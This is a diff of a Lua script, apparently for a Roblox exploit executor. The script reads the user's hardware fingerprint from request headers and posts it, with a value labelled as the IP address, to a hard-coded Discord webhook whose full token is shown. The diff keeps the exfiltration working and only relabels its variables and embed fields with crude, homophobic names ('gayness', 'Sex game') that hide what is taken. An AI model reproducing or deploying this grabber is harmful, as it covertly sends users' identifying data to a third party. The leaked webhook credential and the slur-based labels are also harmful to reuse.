@@ -170,17 +170,17 @@ end
 
 local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
 local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
+local gayness_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+gayness = "";
 
-for i, v in next, hwid_list do
+for i, v in next, gayness_list do
 	if decoded.headers[v] then
-		hwid = decoded.headers[v];
+		gayness = decoded.headers[v];
 		break
 	end
 end
 
-if hwid then
+if gayness then
 local HttpServ = game:GetService('HttpService')
 local url = "https://discord.com/api/webhooks/872564158774804501/CxK4ssrYY4-ToFatBZYFUXf6-dJqTkp1hKWVKIhPcmPfaOgGBKmxAwoJifZHCyhBPmlg"
 
@@ -189,8 +189,8 @@ local data =
     {
         ["content"] = "",
         ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
+            ["title"] = "__**Gayness:**__",
+            ["description"] = gayness,
             ["type"] = "rich",
             ["color"] = tonumber(0xAB0909),
             ["fields"] = {
@@ -200,7 +200,7 @@ local data =
                     ["inline"] = true
                 },
 				{
-                    ["name"] = "IP Address:",
+                    ["name"] = "Sex game:",
                     ["value"] = ident,
                     ["inline"] = true
                 },
